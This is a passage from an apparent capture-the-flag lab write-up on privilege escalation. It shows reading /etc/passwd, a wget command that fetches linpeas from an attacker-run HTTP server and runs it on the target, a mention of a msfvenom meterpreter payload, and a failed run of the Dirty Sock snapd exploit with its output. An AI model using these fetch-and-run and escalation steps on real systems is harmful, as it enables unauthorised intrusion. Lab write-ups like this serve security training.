
**Found flag4 user in /etc/passwd:
**
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
ls /home/flag4 \-lsaF
total 28
4 drwxr\-xr\-x 2 flag4 flag4 4096 Feb 19  2019 \./
4 drwxr\-xr\-x 3 root  root  4096 Apr 11 03:33 \.\./
4 \-rw\-\-\-\-\-\-\- 1 flag4 flag4   28 Feb 19  2019 \.bash\_history
4 \-rw\-r\-\-r\-\- 1 flag4 flag4  220 Feb 19  2019 \.bash\_logout
4 \-rw\-r\-\-r\-\- 1 flag4 flag4 3392 Feb 19  2019 \.bashrc
4 \-rw\-r\-\-r\-\- 1 flag4 flag4  675 Feb 19  2019 \.profile
4 \-rw\-r\-\-r\-\- 1 flag4 flag4  125 Feb 19  2019 flag4\.txt
cat /home/flag4/flag4\.txt
Can you use this same method to find or access the flag in root?

Probably\. But perhaps it's not that easy\.  Or maybe it is?

Their flag looks like theres a clue, maybe /root has a readable \.txt file, tried catting flag\.txt, flag0\-flag10\.txt , etc\.\.

**Idk, hmm\.  But maybe there is something else easy to get root rq?****Lets run a linpeas\.\.**

**made quick script to update linpeas, **getlinpeas

getlinpeas
lin

\[\.\] Serving :Linux: on python3 \-m http\.server 8001
192\.168\.49\.127
Serving HTTP on 0\.0\.0\.0 port 8001 \([http://0.0.0.0:8001/](#http://0.0.0.0:8001/)
\) \.\.\.

**on remote:
**
wget [http://192.168.49.127:8001/linpeas.sh](#http://192.168.49.127:8001/linpeas.sh)
; chmod \+x linpeas\.sh
linpeas\.sh all \> linpeas\.txt \&

**Tried creating a PG elf meterpreter binary w/ msfvenom and running it, got a weird error\.\.**

**Dirty sock2 was one that looked like it could apply here, verified python exists and tried it manually**:

ls \-l
total 16
\-rw\-r\-\-r\-\- 1 www\-data www\-data 8688 Mar 29 12:32 dirtysock2\.py
\-rwxr\-xr\-x 1 www\-data www\-data  250 Apr 11 05:27 pg4464
python dirtysock2\.py

\_\_\_  \_ \_\_\_\_ \_\_\_ \_   \_     \_\_\_\_ \_\_\_\_ \_\_\_\_ \_  \_ 
|  \\ | |\_\_/  |   \\\_/      \[\_\_  |  | |    |\_/  
|\_\_/ | |  \\  |    |   \_\_\_ \_\_\_\] |\_\_| |\_\_\_ | \\\_ 
\(version 2\)
//=========\[\]==========================================\\\\
|| R\&D     || initstring \(@init\_string\)                ||
|| Source  || [https://github.com/initstring/dirty_sock](#https://github.com/initstring/dirty_sock)
||
|| Details || [https://initblog.com/2019/dirty-sock](#https://initblog.com/2019/dirty-sock)
||
\\\\=========\[\]==========================================//

\[\+\] Slipped dirty sock on random socket file: /tmp/jxmvafmtex;uid=0;
\[\+\] Binding to socket file\.\.\.
\[\+\] Connecting to snapd API\.\.\.
Traceback \(most recent call last\):
File "dirtysock2\.py", line 237, in \<module\>
main\(\)
File "dirtysock2\.py", line 218, in main
client\_sock = bind\_sock\(sockfile\)
File "dirtysock2\.py", line 95, in bind\_sock
client\_sock\.connect\('/run/snapd\.socket'\)
File "/usr/lib/python2\.7/socket\.py", line 224, in meth
return getattr\(self\.\_sock,name\)\(\*args\)
socket\.error: \[Errno 2\] No such file or directory

**Looks like /run/snapd\.socket isn't vuln\.**

**Got my list and went thru it for vulns:
**
\-\-\-\> linpeas
\<\-\-\- did find that there were a couple other open sockets:
